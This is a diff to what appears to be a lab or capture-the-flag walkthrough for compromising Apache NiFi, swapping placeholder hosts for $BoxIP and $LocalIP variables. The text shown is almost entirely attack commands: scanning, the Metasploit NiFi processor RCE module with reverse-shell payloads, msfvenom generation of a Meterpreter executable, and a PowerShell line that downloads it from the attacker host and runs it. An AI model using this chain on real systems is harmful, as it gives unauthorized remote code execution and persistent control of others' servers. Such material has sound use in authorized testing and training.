@@ -14,16 +14,16 @@ NiFi lets admins build visual data flows by chaining processors that perform act
 
 ```bash
 # nmap will report Jetty as the HTTP server; title shows "NiFi"
-sudo nmap -sV -p 8080,9443 <target>
+sudo nmap -sV -p 8080,9443 $BoxIP
 # Output: "Jetty 9.x.x / http-title: NiFi"
 
 # Confirm unauthenticated access:
-curl -s http://<target>:8080/nifi-api/system-diagnostics | jq .
+curl -s http://$BoxIP:8080/nifi-api/system-diagnostics | jq .
 # Returns JSON with uptime, heap usage etc. If auth required, returns 401.
 
 # MSF scanner:
 use auxiliary/scanner/http/apache_nifi_version
-set RHOSTS <target>
+set RHOSTS $BoxIP
 set RPORT 8080
 set SSL false
 run
@@ -35,7 +35,7 @@ run
 use exploit/multi/http/apache_nifi_processor_rce
 
 # Required settings:
-set RHOSTS <target>
+set RHOSTS $BoxIP
 set RPORT 8080
 set SSL false          # CRITICAL — module defaults to SSL; plain HTTP instances need this
 set DELAY 20           # seconds before stopping/deleting processor; increase if stage times out
@@ -51,7 +51,7 @@ set payload cmd/windows/powershell_reverse_tcp   # gives a PS session
 # or for Meterpreter in one shot:
 set payload cmd/windows/http/x64/meterpreter/reverse_tcp   # HTTP fetch + Meterpreter stage
 
-set LHOST <kali-ip>
+set LHOST $LocalIP
 set LPORT 4444
 run
 ```
@@ -71,7 +71,7 @@ If the exploit gives a plain PowerShell session rather than Meterpreter:
 
 ```bash
 # 1. Generate met.exe on Kali
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<kali> LPORT=4444 -f exe -o /tmp/met.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LocalIP LPORT=4444 -f exe -o /tmp/met.exe
 
 # 2. Serve it
 python3 -m http.server 8888 -d /tmp/
@@ -79,13 +79,13 @@ python3 -m http.server 8888 -d /tmp/
 # 3. Set up handler (in MSF, background the PS session first with Ctrl+Z)
 use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
-set LHOST <kali>
+set LHOST $LocalIP
 set LPORT 4444
 run -j
 
 # 4. In the PS session:
 sessions -i 1
-iwr http://<kali>:8888/met.exe -OutFile C:\Windows\Temp\met.exe; C:\Windows\Temp\met.exe
+iwr http://$LocalIP:8888/met.exe -OutFile C:\Windows\Temp\met.exe; C:\Windows\Temp\met.exe
 
 # 5. Background PS session (Ctrl+Z), interact with new Meterpreter session
 sessions -i 2
